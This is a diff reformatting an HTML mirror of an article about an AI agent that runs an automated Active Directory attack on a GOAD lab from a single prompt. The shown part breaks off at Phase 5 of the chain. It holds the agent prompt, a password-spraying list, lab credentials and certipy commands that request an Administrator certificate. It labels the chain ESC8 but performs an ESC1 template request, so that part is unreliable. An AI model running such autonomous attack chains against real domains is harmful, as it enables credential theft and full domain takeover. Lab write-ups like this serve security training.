@@ -13,8 +13,8 @@
 <script src="https://1200km.com/assets/theme-bootstrap.js"></script>
 <script src="https://1200km.com/assets/docusaurus-ecosystem.js?v=20260614-3" defer="defer"></script>
 <script src="https://1200km.com/assets/site-theme.js?v=20260721-shell" defer="defer"></script><link rel="stylesheet" href="/medium-blog-navigation/assets/css/styles.c1e57449.css">
-<script src="/medium-blog-navigation/assets/js/runtime~main.ab5f91ad.js" defer="defer"></script>
-<script src="/medium-blog-navigation/assets/js/main.7e23fde8.js" defer="defer"></script>
+<script src="/medium-blog-navigation/assets/js/runtime~main.8d79bc55.js" defer="defer"></script>
+<script src="/medium-blog-navigation/assets/js/main.4b84d819.js" defer="defer"></script>
 <meta name="robots" content="noindex,follow">
 </head>
 <body>
@@ -34,101 +34,101 @@
 <p>This page mirrors the original Medium article into the 1200km.com Docusaurus ecosystem. The original article flow, images, screenshots, infographics, and technical blocks are preserved from the export.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="one-prompt-domain-compromise">One-Prompt Domain Compromise<a href="#one-prompt-domain-compromise" class="hash-link" aria-label="Direct link to One-Prompt Domain Compromise" title="Direct link to One-Prompt Domain Compromise" translate="no">​</a></h3>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="abstract">Abstract<a href="#abstract" class="hash-link" aria-label="Direct link to Abstract" title="Direct link to Abstract" translate="no">​</a></h2>
-<p>This article documents a<strong>fully automated, single-prompt penetration test</strong>that achieves complete domain compromise through the ADCS ESC8 vulnerability. Starting from nothing more than an IP address, an AI-powered attack framework successfully executed the entire attack chain — from reconnaissance to domain compromise — in a single automated session.</p>
-<p>**Key Innovation:**This attack demonstrates the power of AI-driven penetration testing, where a single comprehensive prompt orchestrates multiple tools, handles troubleshooting automatically, and adapts to challenges in real-time.</p>
+<p>This article documents a <strong>fully automated, single-prompt penetration test</strong> that achieves complete domain compromise through the ADCS ESC8 vulnerability. Starting from nothing more than an IP address, an AI-powered attack framework successfully executed the entire attack chain — from reconnaissance to domain compromise — in a single automated session.</p>
+<p><strong>Key Innovation:</strong> This attack demonstrates the power of AI-driven penetration testing, where a single comprehensive prompt orchestrates multiple tools, handles troubleshooting automatically, and adapts to challenges in real-time.</p>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="introduction">Introduction<a href="#introduction" class="hash-link" aria-label="Direct link to Introduction" title="Direct link to Introduction" translate="no">​</a></h2>
-<p>Traditional penetration testing requires manual intervention at each step: running tools, interpreting results, making decisions, and troubleshooting failures. This article presents a revolutionary approach:<strong>a fully automated attack that requires only one prompt</strong>to execute the complete ADCS ESC8 attack chain.</p>
+<p>Traditional penetration testing requires manual intervention at each step: running tools, interpreting results, making decisions, and troubleshooting failures. This article presents a revolutionary approach: <strong>a fully automated attack that requires only one prompt</strong> to execute the complete ADCS ESC8 attack chain.</p>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-makes-this-attack-complicated">What Makes This Attack Complicated?<a href="#what-makes-this-attack-complicated" class="hash-link" aria-label="Direct link to What Makes This Attack Complicated?" title="Direct link to What Makes This Attack Complicated?" translate="no">​</a></h2>
 <ul>
 <li class="">
-<p>**Multi-Stage Attack Chain:**7 distinct phases, each with dependencies</p>
+<p><strong>Multi-Stage Attack Chain:</strong> 7 distinct phases, each with dependencies</p>
 </li>
 <li class="">
-<p>**Blackbox Approach:**Starting with zero knowledge (only IP address)</p>
+<p><strong>Blackbox Approach:</strong> Starting with zero knowledge (only IP address)</p>
 </li>
 <li class="">
-<p>**Automatic Troubleshooting:**Handles errors and adapts automatically</p>
+<p><strong>Automatic Troubleshooting:</strong> Handles errors and adapts automatically</p>
 </li>
 <li class="">
-<p>**Tool Orchestration:**Coordinates multiple security tools seamlessly</p>
+<p><strong>Tool Orchestration:</strong> Coordinates multiple security tools seamlessly</p>
 </li>
 <li class="">
-<p>**Intelligent Decision Making:**AI determines next steps based on results</p>
+<p><strong>Intelligent Decision Making:</strong> AI determines next steps based on results</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="attack-overview">Attack Overview<a href="#attack-overview" class="hash-link" aria-label="Direct link to Attack Overview" title="Direct link to Attack Overview" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="target-environment">Target Environment<a href="#target-environment" class="hash-link" aria-label="Direct link to Target Environment" title="Direct link to Target Environment" translate="no">​</a></h3>
 <ul>
 <li class="">
-<p><strong>Target IP:</strong><code>192.168.56.10</code></p>
+<p><strong>Target IP:</strong> <code>192.168.56.10</code></p>
 </li>
 <li class="">
-<p>**Environment:**GOAD-Mini (Game of Active Directory)</p>
+<p><strong>Environment:</strong> GOAD-Mini (Game of Active Directory)</p>
 </li>
 <li class="">
-<p>**Starting Point:**IP address only (blackbox)</p>
+<p><strong>Starting Point:</strong> IP address only (blackbox)</p>
 </li>
 <li class="">
-<p>**End Goal:**Full domain compromise with all password hashes</p>
+<p><strong>End Goal:</strong> Full domain compromise with all password hashes</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="attack-chain">Attack Chain<a href="#attack-chain" class="hash-link" aria-label="Direct link to Attack Chain" title="Direct link to Attack Chain" translate="no">​</a></h2>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">IP </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Address</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> (</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">56.10</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[Phase 1]</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Reconnaissance</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ Port Scanning</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ Service Enumeration</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ Domain Discovery</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    └─ ADCS Detection</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[Phase 2]</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Credential Acquisition</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ Password Spraying</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ ASREPRoasting</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    └─ Kerberoasting</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[Phase 3]</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> ADCS Enumeration</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ CA Discovery</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ Template Enumeration</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    └─ Vulnerability Verification</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[Phase 4]</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Certificate Request</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ Authenticate with Low-Privilege Creds</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ Request Administrator Certificate</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    └─ Save Certificate (.pfx)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[Phase 5]</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Certificate Authentication</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ Use Certificate for PKINIT</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ Obtain Kerberos TGT</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    └─ Extract NTLM Hash</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[Phase 6]</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Domain Compromise</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ DCSync Attack</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ Extract </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">All</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Domain Hashes</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    └─ Verify krbtgt Hash Obtained</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[Phase 7]</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Reporting</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ Generate Comprehensive Report</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ Document </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">All</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> Artifacts</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    └─ Create Proof of Compromise</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">IP Address (192.168.56.10)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[Phase 1] Reconnaissance</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ Port Scanning</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ Service Enumeration</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ Domain Discovery</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    └─ ADCS Detection</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[Phase 2] Credential Acquisition</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ Password Spraying</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ ASREPRoasting</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    └─ Kerberoasting</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[Phase 3] ADCS Enumeration</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ CA Discovery</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ Template Enumeration</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    └─ Vulnerability Verification</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[Phase 4] Certificate Request</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ Authenticate with Low-Privilege Creds</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ Request Administrator Certificate</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    └─ Save Certificate (.pfx)</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[Phase 5] Certificate Authentication</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ Use Certificate for PKINIT</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ Obtain Kerberos TGT</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    └─ Extract NTLM Hash</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[Phase 6] Domain Compromise</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ DCSync Attack</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ Extract All Domain Hashes</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    └─ Verify krbtgt Hash Obtained</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ↓</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[Phase 7] Reporting</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ Generate Comprehensive Report</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    ├─ Document All Artifacts</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">    └─ Create Proof of Compromise</span><br></div></code></pre></div></div>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-one-prompt-approach">The One-Prompt Approach<a href="#the-one-prompt-approach" class="hash-link" aria-label="Direct link to The One-Prompt Approach" title="Direct link to The One-Prompt Approach" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-prompt">The Prompt<a href="#the-prompt" class="hash-link" aria-label="Direct link to The Prompt" title="Direct link to The Prompt" translate="no">​</a></h3>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Perform </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">a</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> fully automated blackbox penetration test starting </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">from</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> IP </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">address</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">56.10</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">. </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Execute the complete ADCS ESC8 attack chain </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">to</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> achieve domain compromise. Use HexStrike MCP </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">tools and handle </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">all</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> troubleshooting automatically.</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Perform a fully automated blackbox penetration test starting from IP address 192.168.56.10. </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">Execute the complete ADCS ESC8 attack chain to achieve domain compromise. Use HexStrike MCP </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">tools and handle all troubleshooting automatically.</span><br></div></code></pre></div></div>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-this-works">Why This Works<a href="#why-this-works" class="hash-link" aria-label="Direct link to Why This Works" title="Direct link to Why This Works" translate="no">​</a></h2>
 <ul>
 <li class="">
-<p>**Comprehensive Instructions:**The prompt contains all phases, objectives, and troubleshooting steps</p>
+<p><strong>Comprehensive Instructions:</strong> The prompt contains all phases, objectives, and troubleshooting steps</p>
 </li>
 <li class="">
-<p>**Tool Integration:**Leverages HexStrike MCP tools for seamless tool execution</p>
+<p><strong>Tool Integration:</strong> Leverages HexStrike MCP tools for seamless tool execution</p>
 </li>
 <li class="">
-<p>**Error Handling:**Includes automatic troubleshooting for common failures</p>
+<p><strong>Error Handling:</strong> Includes automatic troubleshooting for common failures</p>
 </li>
 <li class="">
-<p>**Adaptive Execution:**AI can make decisions based on intermediate results</p>
+<p><strong>Adaptive Execution:</strong> AI can make decisions based on intermediate results</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="phase-by-phase-execution">Phase-by-Phase Execution<a href="#phase-by-phase-execution" class="hash-link" aria-label="Direct link to Phase-by-Phase Execution" title="Direct link to Phase-by-Phase Execution" translate="no">​</a></h2>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="phase-1-reconnaissance">Phase 1: Reconnaissance<a href="#phase-1-reconnaissance" class="hash-link" aria-label="Direct link to Phase 1: Reconnaissance" title="Direct link to Phase 1: Reconnaissance" translate="no">​</a></h3>
-<p>**Objective:**Discover the target environment with zero prior knowledge.</p>
+<p><strong>Objective:</strong> Discover the target environment with zero prior knowledge.</p>
 <p><strong>Tools Used:</strong></p>
 <ul>
 <li class="">
-<p><code>nmap_advanced_scan</code>- Comprehensive port scanning</p>
+<p><code>nmap_advanced_scan</code> - Comprehensive port scanning</p>
 </li>
 <li class="">
-<p><code>rustscan_fast_scan</code>- Quick port discovery</p>
+<p><code>rustscan_fast_scan</code> - Quick port discovery</p>
 </li>
 <li class="">
-<p><code>enum4linux_scan</code>- SMB enumeration</p>
+<p><code>enum4linux_scan</code> - SMB enumeration</p>
 </li>
 <li class="">
-<p><code>smbmap_scan</code>- Share enumeration</p>
+<p><code>smbmap_scan</code> - Share enumeration</p>
 </li>
 <li class="">
-<p><code>nbtscan_netbios</code>- NetBIOS name discovery</p>
+<p><code>nbtscan_netbios</code> - NetBIOS name discovery</p>
 </li>
 <li class="">
-<p><code>httpx_probe</code>- HTTP service detection</p>
+<p><code>httpx_probe</code> - HTTP service detection</p>
 </li>
 </ul>
 <p><strong>Key Discoveries:</strong></p>
 <ul>
 <li class="">
-<p>Domain:<code>sevenkingdoms.local</code></p>
+<p>Domain: <code>sevenkingdoms.local</code></p>
 </li>
 <li class="">
-<p>NetBIOS:<code>SEVENKINGDOMS</code></p>
+<p>NetBIOS: <code>SEVENKINGDOMS</code></p>
 </li>
 <li class="">
-<p>DC Hostname:<code>kingslanding.sevenkingdoms.local</code></p>
+<p>DC Hostname: <code>kingslanding.sevenkingdoms.local</code></p>
 </li>
 <li class="">
-<p>ADCS Web Enrollment:<code>http://192.168.56.10/certsrv/</code>(HTTP - vulnerable!)</p>
+<p>ADCS Web Enrollment: <code>http://192.168.56.10/certsrv/</code> (HTTP - vulnerable!)</p>
 </li>
 </ul>
 <p><strong>Automation Features:</strong></p>
@@ -144,14 +144,14 @@
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="phase-2-credential-acquisition">Phase 2: Credential Acquisition<a href="#phase-2-credential-acquisition" class="hash-link" aria-label="Direct link to Phase 2: Credential Acquisition" title="Direct link to Phase 2: Credential Acquisition" translate="no">​</a></h3>
-<p>**Objective:**Obtain low-privilege domain credentials.</p>
+<p><strong>Objective:</strong> Obtain low-privilege domain credentials.</p>
 <p><strong>Tools Used:</strong></p>
 <ul>
 <li class="">
-<p><code>hydra_attack</code>- Password spraying</p>
+<p><code>hydra_attack</code> - Password spraying</p>
 </li>
 <li class="">
-<p><code>netexec_scan</code>- Credential validation</p>
+<p><code>netexec_scan</code> - Credential validation</p>
 </li>
 </ul>
 <p><strong>Attack Strategy:</strong></p>
@@ -163,16 +163,16 @@
 <p>Attempt password spraying with common passwords</p>
 </li>
 <li class="">
-<p>Try:<code>Password123!</code>,<code>Summer2023!</code>,<code>Password1</code>,<code>admin</code></p>
+<p>Try: <code>Password123!</code>, <code>Summer2023!</code>, <code>Password1</code>, <code>admin</code></p>
 </li>
 </ul>
 <p><strong>Results:</strong></p>
 <ul>
 <li class="">
-<p><strong>Credentials Obtained:</strong><code>TestUser:Password123!</code></p>
+<p><strong>Credentials Obtained:</strong> <code>TestUser:Password123!</code></p>
 </li>
 <li class="">
-<p>**Access Level:**Low-privilege domain user</p>
+<p><strong>Access Level:</strong> Low-privilege domain user</p>
 </li>
 </ul>
 <p><strong>Automation Features:</strong></p>
@@ -188,31 +188,31 @@
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="phase-3-adcs-enumeration">Phase 3: ADCS Enumeration<a href="#phase-3-adcs-enumeration" class="hash-link" aria-label="Direct link to Phase 3: ADCS Enumeration" title="Direct link to Phase 3: ADCS Enumeration" translate="no">​</a></h3>
-<p>**Objective:**Enumerate ADCS configuration and identify vulnerabilities.</p>
+<p><strong>Objective:</strong> Enumerate ADCS configuration and identify vulnerabilities.</p>
 <p><strong>Tools Used:</strong></p>
 <ul>
 <li class="">
-<p><code>dirsearch_scan</code>- ADCS endpoint discovery</p>
+<p><code>dirsearch_scan</code> - ADCS endpoint discovery</p>
 </li>
 <li class="">
-<p><code>execute_python_script</code>- Certipy enumeration</p>
+<p><code>execute_python_script</code> - Certipy enumeration</p>
 </li>
 </ul>
 <p><strong>Enumeration Commands:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">certipy </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">find</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -u TestUser@sevenkingdoms.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">local</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> -p </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;Password123!&#x27;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -dc-ip </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.56</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.10</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">certipy find -u TestUser@sevenkingdoms.local -p &#x27;Password123!&#x27; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -dc-ip 192.168.56.10</span><br></div></code></pre></div></div>
 <p><strong>Key Findings:</strong></p>
 <ul>
 <li class="">
-<p><strong>CA Name:</strong><code>SEVENKINGDOMS-CA</code></p>
+<p><strong>CA Name:</strong> <code>SEVENKINGDOMS-CA</code></p>
 </li>
 <li class="">
-<p>**Vulnerable Templates:**ESC1, ESC8</p>
+<p><strong>Vulnerable Templates:</strong> ESC1, ESC8</p>
 </li>
 <li class="">
-<p>**ESC8 Confirmed:**HTTP Web Enrollment accessible</p>
+<p><strong>ESC8 Confirmed:</strong> HTTP Web Enrollment accessible</p>
 </li>
 <li class="">
-<p>**Template Count:**34 templates discovered</p>
+<p><strong>Template Count:</strong> 34 templates discovered</p>
 </li>
 </ul>
 <p><strong>Automation Features:</strong></p>
@@ -228,23 +228,23 @@
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="phase-4-certificate-request">Phase 4: Certificate Request<a href="#phase-4-certificate-request" class="hash-link" aria-label="Direct link to Phase 4: Certificate Request" title="Direct link to Phase 4: Certificate Request" translate="no">​</a></h3>
-<p>**Objective:**Obtain certificate for Administrator account.</p>
+<p><strong>Objective:</strong> Obtain certificate for Administrator account.</p>
 <p><strong>Tools Used:</strong></p>
 <ul>
-<li class=""><code>execute_python_script</code>- Certipy certificate request</li>
+<li class=""><code>execute_python_script</code> - Certipy certificate request</li>
 </ul>
 <p><strong>Attack Command:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">certipy req </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">u TestUser</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">@sevenkingdoms</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">local</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">p </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&#x27;Password123!&#x27;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">target http:</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">/</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">192.168</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.56</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.10</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">ca SEVENKINGDOMS</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">CA \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">template ESC1 \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">upn Administrator</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">@sevenkingdoms</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">local</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">out</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> administrator.pfx</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">certipy req -u TestUser@sevenkingdoms.local -p &#x27;Password123!&#x27; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -target http://192.168.56.10 \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -ca SEVENKINGDOMS-CA \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -template ESC1 \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -upn Administrator@sevenkingdoms.local \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  -out administrator.pfx</span><br></div></code></pre></div></div>
 <p><strong>Results:</strong></p>
 <ul>
 <li class="">
-<p><strong>Certificate Obtained:</strong><code>administrator.pfx</code></p>
+<p><strong>Certificate Obtained:</strong> <code>administrator.pfx</code></p>
 </li>
 <li class="">
-<p><strong>Status:</strong>✓ Success</p>
+<p><strong>Status:</strong> ✓ Success</p>
 </li>
 <li class="">
-<p>**Template Used:**ESC1 (vulnerable template)</p>
+<p><strong>Template Used:</strong> ESC1 (vulnerable template)</p>
 </li>
 </ul>
 <p><strong>Automation Features:</strong></p>
@@ -260,23 +260,23 @@
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="phase-5-certificate-authentication">Phase 5: Certificate Authentication<a href="#phase-5-certificate-authentication" class="hash-link" aria-label="Direct link to Phase 5: Certificate Authentication" title="Direct link to Phase 5: Certificate Authentication" translate="no">​</a></h3>
-<p>**Objective:**Use certificate for Kerberos authentication.</p>
+<p><strong>Objective:</strong> Use certificate for Kerberos authentication.</p>
 <p><strong>Tools Used:</strong></p>
 <ul>
